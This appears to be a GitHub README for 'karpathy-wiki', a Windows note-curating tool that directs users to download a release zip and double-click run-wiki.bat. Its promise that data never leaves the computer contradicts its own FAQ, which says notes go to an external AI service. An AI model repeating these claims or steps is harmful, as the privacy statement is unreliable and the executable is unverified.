# 🧠 karpathy-wiki - Organize your personal digital knowledge base

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ohialha4618/karpathy-wiki/releases)

karpathy-wiki functions as a smart assistant for your notes. It uses artificial intelligence to keep your files organized, updated, and linked. You keep full control of your data because the software stores everything as plain text files on your computer.

## 🛠 What this software does

Managing a growing collection of notes requires effort. This tool automates that labor. It reads your raw notes and turns them into a clean, searchable wiki. Three separate agents handle the curation process:

1. The WikiCompilerAgent organizes your raw thoughts into finished pages with working links. 
2. The ResearchAgent answers your specific questions based on your notes. It provides citations so you know where the information originated. 
3. The WikiLinterAgent scans your files. It finds missing links, orphans, or incomplete thoughts. It also suggests ways to connect your ideas.

Everything operates through a local command line interface. Your data never leaves your computer, ensuring your notes stay private.

## 📋 System requirements

- Windows 10 or 11
- 4GB of available RAM
- 500MB of disk space for the program files
- Basic knowledge of file folders

## 📥 Getting started

Follow these steps to install the software on your Windows computer.

1. Visit the following page to choose your download: https://github.com/Ohialha4618/karpathy-wiki/releases
2. Look for the section labeled Assets.
3. Select the file named `karpathy-wiki-windows.zip`.
4. Your browser will download the compressed folder to your computer.

## ⚙️ Setting up the application

1. Open your Downloads folder in File Explorer.
2. Right-click the `karpathy-wiki-windows.zip` file.
3. Select Extract All and choose a folder on your computer where you want to keep your wiki tools.
4. Open the extracted folder.
5. Double-click the file named `run-wiki.bat` to launch the application.
6. A black terminal window will appear. This is your personal interface for the wiki.

## 📝 Editing your wiki structure

You define how your wiki behaves using a single file named `SCHEMA.md`. This file lives in the same folder as your notes. You can open this file with Notepad or any text editor. When you change the text inside this file, the agents update the format of your entire wiki during the next launch. You do not need to rewrite any code to customize your system.

## 🔍 How to use the agents

Once the program runs, you interact with it by typing commands. 

- To organize your raw files, run the compiler command. The agent reads your drops and creates the finished wiki environment.
- To ask questions, use the research command followed by your query. The system searches your local files and returns a structured response.
- To clean your files, use the linter command. The system generates a report listing suggestions for better structure and connection.

## 🛡 Keeping data safe

Because this software uses plain text files, you maintain full ownership. You can move your notes to any other program at any time. The software does not hide your work inside a proprietary database. You can back up your wiki by copying your notes folder to a cloud drive or an external storage device.

## ❓ Frequently asked questions

### Does this connect to the internet?
The software connects to an external AI service to process your notes. No personal credentials or identifying data are shared. 

### Why is there no graphical interface?
The interface uses a text-based system to ensure high performance. This method keeps the software fast and reliable even if you have thousands of notes.

### Can I delete the software?
You can remove the application by deleting the folder you extracted earlier. Your notes remain inside your original text files unless you choose to delete them as well.

### What happens if the software stops?
Simply restart the `run-wiki.bat` file. The local storage system ensures you never lose your progress during a crash.

### How do I update my wiki?
Add your new notes to the configured input folder. The software automatically detects new entries every time you run the curation commands.

### Is my hardware good enough?
Most modern office computers handle this software well. If you have a computer purchased within the last five years, you will experience smooth performance.

### How do I report a bug?
If the terminal displays an error, take a screenshot of the text. You can visit the project page to submit feedback to the developers.